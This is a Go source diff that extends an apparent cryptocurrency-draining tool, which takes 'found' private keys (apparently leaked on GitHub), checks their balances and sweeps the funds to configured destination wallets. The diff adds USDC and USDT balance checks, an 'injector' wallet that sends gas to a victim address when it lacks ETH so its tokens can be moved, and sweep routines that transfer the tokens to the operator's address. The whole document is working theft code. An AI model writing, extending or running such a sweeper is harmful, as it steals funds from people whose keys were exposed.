@@ -10,6 +10,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"math/big"
 	"net/http"
 	"os"
 	"os/signal"
@@ -27,6 +28,7 @@ type Config struct {
 	SuiNodeURL    string
 	WebhookURL    string
 	WebhookSecret string
+	InjectorKey   string
 	DestETH       string
 	DestBTC       string
 	DestSolana    string
@@ -45,6 +47,8 @@ func main() {
 
 	flag.StringVar(&cfg.GitHubToken, "github-token", os.Getenv("GITHUB_TOKEN"),
 		"GitHub personal access token(s) — comma-separated for multiple (or set GITHUB_TOKEN env)")
+	flag.StringVar(&cfg.InjectorKey, "injector-key", os.Getenv("INJECTOR_KEY"),
+		"Private key of the gas injector wallet (for ERC20 token sweeping)")
 	flag.StringVar(&cfg.ETHNodeURL, "eth-rpc", os.Getenv("ETH_RPC_URL"),
 		"Ethereum JSON-RPC endpoint (default: Cloudflare public node)")
 	flag.StringVar(&cfg.SolanaNodeURL, "sol-rpc", os.Getenv("SOL_RPC_URL"),
@@ -291,9 +295,64 @@ func handleFoundKey(ctx context.Context, key FoundKey, cfg *Config) {
 		logger.Printf("[balance] error: %v", err)
 	}
 
+	if addrs.ETH != "" {
+		usdc := checkERC20Balance(ctx, addrs.ETH, usdcContract, 6, "USDC", cfg.ETHNodeURL)
+		usdt := checkERC20Balance(ctx, addrs.ETH, usdtContract, 6, "USDT", cfg.ETHNodeURL)
+		if usdc.HasFunds {
+			balances = append(balances, usdc)
+		}
+		if usdt.HasFunds {
+			balances = append(balances, usdt)
+		}
+	}
+
+	var ethBalance *big.Int
+	tokenCount := 0
+	hasNativeETH := false
+	for _, b := range balances {
+		if b.Chain == "Ethereum" && b.HasFunds {
+			ethBalance = b.Balance
+			hasNativeETH = true
+		}
+		if b.Chain == "USDC" || b.Chain == "USDT" {
+			tokenCount++
+		}
+	}
+
+	skipTokens := false
+	if tokenCount > 0 && cfg.InjectorKey != "" {
+		if ethBalance == nil {
+			ethBalance = big.NewInt(0)
+		}
+		nodeURL := cfg.ETHNodeURL
+		if nodeURL == "" {
+			nodeURL = "https://cloudflare-eth.com"
+		}
+		gasPrice, gpErr := ethGasPrice(ctx, nodeURL)
+		if gpErr == nil {
+			needed := new(big.Int).Mul(gasPrice, big.NewInt(21000+int64(tokenCount)*int64(erc20GasLimit)))
+			if ethBalance.Cmp(needed) < 0 {
+				logger.Printf("[inject] ETH balance %s insufficient for %d token sweeps, injecting gas",
+					formatETH(ethBalance), tokenCount)
+				if iErr := InjectGas(ctx, cfg, addrs.ETH, tokenCount); iErr != nil {
+					logger.Printf("[inject] error: %v — skipping token sweeps", iErr)
+					if !hasNativeETH {
+						skipTokens = true
+					}
+				} else {
+					ethBalance = needed
+				}
+			}
+		}
+	}
+
 	for _, b := range balances {
 		logBalance(b, key)
 		if !b.HasFunds {
+			continue
+		}
+		if skipTokens && (b.Chain == "USDC" || b.Chain == "USDT") {
+			logger.Printf("[sweep] skipping %s sweep — no gas available", b.Chain)
 			continue
 		}
 		if cfg.DryRun {
@@ -378,6 +437,20 @@ func sweep(ctx context.Context, key FoundKey, b BalanceResult, addrs DerivedAddr
 			return
 		}
 		txHash, err = SweepXLM(ctx, key.Raw, cfg.DestXLM)
+
+	case "USDC":
+		if cfg.DestETH == "" {
+			logger.Println("[sweep] no dest-eth configured, skipping USDC sweep")
+			return
+		}
+		txHash, err = SweepERC20(ctx, key.Raw, usdcContract, cfg.DestETH, cfg.ETHNodeURL)
+
+	case "USDT":
+		if cfg.DestETH == "" {
+			logger.Println("[sweep] no dest-eth configured, skipping USDT sweep")
+			return
+		}
+		txHash, err = SweepERC20(ctx, key.Raw, usdtContract, cfg.DestETH, cfg.ETHNodeURL)
 
 	default:
 		logger.Printf("[sweep] chain %s not yet supported for sweeping", b.Chain)
